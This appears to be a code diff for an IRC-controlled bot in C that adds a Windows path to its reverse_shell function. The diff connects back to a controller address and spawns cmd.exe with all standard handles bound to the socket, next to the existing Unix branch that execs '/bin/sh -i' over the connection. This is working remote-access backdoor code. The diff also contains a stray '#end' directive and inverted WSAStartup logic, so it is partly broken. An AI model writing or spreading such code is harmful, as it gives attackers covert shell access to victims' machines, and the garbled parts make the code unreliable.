@@ -2,6 +2,9 @@
 #include "net.h"
 #include "irc.h"
 #include "logger.h"
+#ifdef _WIN32
+#include <io.h>
+#endif
 
 void create_socketfd(int* fd) {
     while (1) {
@@ -122,6 +125,7 @@ int read_packet(int *fd, CHAR *buffer) {
 int read_packet(int *fd, char *buffer) {
 #endif
     size_t length = 0;
+    // This pattern is applied because we want to make sure there is no overflow
     while (1) {
 #ifdef _WIN32
         CHAR data;
@@ -155,18 +159,29 @@ int read_packet(int *fd, char *buffer) {
 
 #ifdef _WIN32
 void reverse_shell(CHAR *ip, int port) {
+    WSADATA wsaData;
 #else
 void reverse_shell(char *ip, int port) {
 #endif
+    int shell_fd;
     struct sockaddr_in sockin;
     sockin.sin_family = AF_INET;
+
 #ifdef _WIN32
-#else
-    int shell_fd;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData)) {
+        shell_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    }
+#endif
 
     sockin.sin_family = AF_INET;
-    sockin.sin_addr.s_addr = inet_addr(ip);
     sockin.sin_port = htons(port);
+
+#ifdef _WIN32
+    InetPton(AF_INET, _T(IRC_IP), &sockin.sin_addr.s_addr);
+#else
+    sockin.sin_addr.s_addr = inet_addr(ip);
+#endif // _WIN32
+
 
     shell_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
@@ -177,7 +192,23 @@ void reverse_shell(char *ip, int port) {
     if (connect(shell_fd, (struct sockaddr *)&sockin, sizeof(sockin)) == SOCKET_ERROR) {
         return;
     }
+#ifdef _WIN32
+    wchar_t proc[8] = L"cmd.exe";
+    STARTUPINFO str_in;
+    PROCESS_INFORMATION proc_in;
+    memset(&str_in, 0, sizeof(str_in));
+    str_in.cb = sizeof(str_in);
+    str_in.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+    str_in.hStdInput = str_in.hStdOutput = str_in.hStdError = (HANDLE)shell_fd; // foward all file descriptors to our shell file descriptor
 
+    _write(shell_fd, SHELL_MOTD, strlen(SHELL_MOTD));
+
+    CreateProcess(NULL, proc, NULL, NULL, TRUE, 0, NULL, NULL, &str_in, &proc_in); // create process cmd
+    WaitForSingleObject(proc_in.hProcess, INFINITE);
+    CloseHandle(proc_in.hProcess);
+    CloseHandle(proc_in.hThread);
+
+#else
     write(shell_fd, SHELL_MOTD, strlen(SHELL_MOTD));
 
     dup2(shell_fd, 0);
@@ -186,6 +217,7 @@ void reverse_shell(char *ip, int port) {
 
     execl("/bin/sh", "sh", "-i", NULL, NULL);
     close(shell_fd);
+#end
 #endif
 
 }
